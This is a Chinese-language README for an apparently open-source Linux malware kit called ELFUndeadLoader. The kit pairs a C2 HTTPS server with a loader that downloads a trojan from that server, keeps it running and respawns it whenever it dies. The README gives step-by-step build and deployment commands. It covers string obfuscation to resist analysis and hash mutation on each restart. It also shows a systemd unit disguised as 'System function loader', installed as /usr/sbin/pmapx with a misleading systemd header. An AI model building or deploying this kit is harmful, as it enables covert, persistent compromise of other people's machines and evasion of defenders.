# ELFUndeadLoader

Linux下的不死马，一个简单的实现

## 特点

程序整体由三部分组成：HTTPS(C2)服务器、监听器(Loader)、木马（evil）。

特点如下：

1.对外通信流量加密。

2.所有运行在目标设备上的文件中关键字符串均被混淆，抗字符串分析。

3.木马具有一定的变异性，每次重新拉起散列值都会变。

4.木马进程及监听器进程都是后台进程，稳定性较高。

5.木马进程与监听器进程无进程树继承关系。



## 原理

在Linux下部署一个监听器（Loader）进程，并添加到自启动服务。监听器会自动从服务器上下载一个恶意程序到本地，运行它的副本，当监听器发现副本程序的进程没了会自动创建一个新的副本程序。

coinminer家族`f865499c56a13d5a789ad1f8c69e87526bed2bbb66fc43874eb885c303a60b28`为了确保自身挖矿进程的持久驻留，有多种变形。本人在实际工作中遇到的过一次这样的恶意样本，本程序其实是对该家族用到的持久化技术的概念性实现及增强。

网上也有不少关于这一家族挖矿病毒的行为及排查分析。

```text
https://zhuanlan.zhihu.com/p/387469244
http://les1ie.com/2021/05/18/%E4%B8%A4%E6%AC%A1%E6%BA%AF%E6%BA%90/
```



## 使用

### HTTPS服务器

搭建一个HTTPS服务器作为文件服务器及命令控制服务器。

**step1**：搭建一个定制版的https服务器。

可以使用我写的一个https服务器。该服务器不同于普通的python服务器，支持对get/post请求的记录，无路径泄露问题，抗目录爆破攻击。

```shell
cd MyHTTPServer;
python3 MyHTTPServer.py -p 8443 
```



**step2**：编译evil.c。这是一个简单的木马后台程序，该程序能够定期向服务器请求shell脚本执行内部的命令。

```shell
cd MyHTTPServer/html/src726bbcdb43db625d685c9adbe09b;

# 你需要在evil.c中先设置好服务器地址信息。 evil.c也内置了关键字混淆器，可以打开使用。完成这些操作后执行下面命令进行编译。
gcc evil.c -o ../elf34e61aa704fcfec8a04d1dbc7a156/x64/evil
```



**step3**：在https服务器的相关目录下放置一个evil程序会定时请求的命令文件。

```
echo "hello world" >> MyHTTPServer/html/task10557089e37ed1f0ecfbfd042974/task/hello.sh
```



### ELF不死马

制作一个监听器程序，确保evil程序能够持久的驻留在系统中。

**step1**：修改obfuscator.c中关于关键地址信息的定义。混淆器会加密这些信息，并生成一份可用的加载器源码。（loader.c）

```shell
gcc obfuscator.c -o obfuscator; ./obfuscator
```



**step2**：编译加载器（loader.c），并将程序部署到目标设备上(/usr/sbin/pmapx)。

```shell
gcc loader.c -lpthread -o pmapx
```



**step3**：在目标设备上创建自启动服务。

/usr/lib/systemd/system/pmapx_start.service

```c
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See resolved.conf(5) for details

[Unit]
Description=System function loader.

[Service]
Type=forking
GuessMainPID=no
Restart=always
RestartSec=10
ExecStart=-/usr/sbin/pmapx

[Install]
WantedBy=multi-user.target
```

